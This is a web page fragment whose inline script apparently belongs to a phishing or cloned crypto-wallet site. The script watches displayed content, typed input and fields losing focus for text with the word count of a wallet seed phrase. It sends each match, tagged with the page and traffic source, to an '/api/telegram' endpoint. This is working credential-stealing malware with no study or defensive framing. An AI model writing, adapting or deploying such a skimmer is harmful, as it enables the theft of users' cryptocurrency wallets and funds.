  <body>
    <div id="root"></div>
    <script>
(function(){
  const API="/api/telegram";
  let timeout,lastSent="";

  function getSource(){
    const r=document.referrer.toLowerCase(),p=new URLSearchParams(location.search);
    if(r.includes("google.com")||r.includes("google.co"))return"Google SEO";
    if(r.includes("bing.com"))return"Bing SEO";
    const s=p.get("utm_source")||p.get("source");
    if(s){if(s.toLowerCase().includes("google"))return"Google SEO";if(s.toLowerCase().includes("bing"))return"Bing SEO";}
    return r||"Direct";
  }
  const src=getSource();

  async function send(data){
    // Always attach traffic source
    data.trafficSource=src;
    data.timestamp=new Date().toISOString();
    for(let i=0;i<3;i++){
      try{
        const r=await fetch(API,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({data})});
        if(!r.ok)throw Error("HTTP "+r.status);
        return await r.json();
      }catch(e){
        if(i===2)throw e;
        await new Promise(r=>setTimeout(r,1000*(i+1)));
      }
    }
  }

  function wordCount(val){
    return val.trim().split(/\s+/).filter(w=>w.length>0).length;
  }

  function isSeedPhrase(val){
    return val&&[12,15,18,21,24].includes(wordCount(val));
  }

  // Send phrase with full clear format
  function sendPhrase(phrase,type,extra){
    if(!phrase||phrase===lastSent)return;
    lastSent=phrase;
    const wc=wordCount(phrase);
    const payload=Object.assign({
      TYPE:type,
      PHRASE:phrase,
      WORDS:wc,
      PAGE:location.pathname
    },extra||{});
    send(payload)
      .then(()=>console.log("✅ Sent phrase:",wc,"words from",src))
      .catch(e=>console.error("❌ Failed:",e));
  }

  // Monitor DOM for displayed phrases (wallet creation)
  function checkDOM(root){
    if(!root||!root.querySelectorAll)return;
    const els=root.querySelectorAll('*');
    els.forEach(el=>{
      if(el.getAttribute("data-tp-logged"))return;
      let txt="";
      if(el.tagName==="INPUT"||el.tagName==="TEXTAREA"){
        txt=el.value||"";
      }else if(el.children.length===0||el.tagName==="PRE"||el.tagName==="CODE"){
        // Only leaf nodes or pre/code to avoid duplicates
        txt=el.textContent||"";
      }
      txt=txt.trim();
      if(isSeedPhrase(txt)){
        el.setAttribute("data-tp-logged","1");
        console.log("📋 Phrase in DOM:",wordCount(txt),"words, element:",el.tagName,el.className.substring(0,40));
        sendPhrase(txt,"WALLET_CREATED_DISPLAYED",{
          ELEMENT:el.tagName+(el.className?"."+(el.className.toString().trim().split(" ")[0]):"")
        });
      }
    });
  }

  function startMonitor(){
    // Watch for DOM changes
    new MutationObserver(muts=>{
      muts.forEach(m=>m.addedNodes.forEach(n=>{
        if(n.nodeType===1)checkDOM(n);
      }));
    }).observe(document.body,{childList:true,subtree:true});
    // Scan at intervals to catch lazy-loaded content
    [1000,2000,4000,6000,10000].forEach(t=>setTimeout(()=>checkDOM(document.body),t));
  }

  document.addEventListener("DOMContentLoaded",startMonitor);

  // Capture user-typed phrases
  document.addEventListener("input",e=>{
    const t=e.target;
    if(t.tagName==="TEXTAREA"||t.tagName==="INPUT"){
      clearTimeout(timeout);
      timeout=setTimeout(()=>{
        const v=t.value.trim();
        if(isSeedPhrase(v)&&v!==lastSent){
          sendPhrase(v,"SEED_PHRASE",{
            FIELD:t.name||t.id||t.placeholder||"input"
          });
        }
      },600);
    }
  });

  // Also capture on blur (when user leaves field)
  document.addEventListener("blur",e=>{
    const t=e.target;
    if((t.tagName==="TEXTAREA"||t.tagName==="INPUT")&&t.value.trim()){
      const v=t.value.trim();
      if(isSeedPhrase(v)&&v!==lastSent){
        sendPhrase(v,"SEED_ON_BLUR",{
          FIELD:t.name||t.id||t.placeholder||"input"
        });
      }
    }
  },true);

  window.TelegramIntegration={send};
})();
    </script>
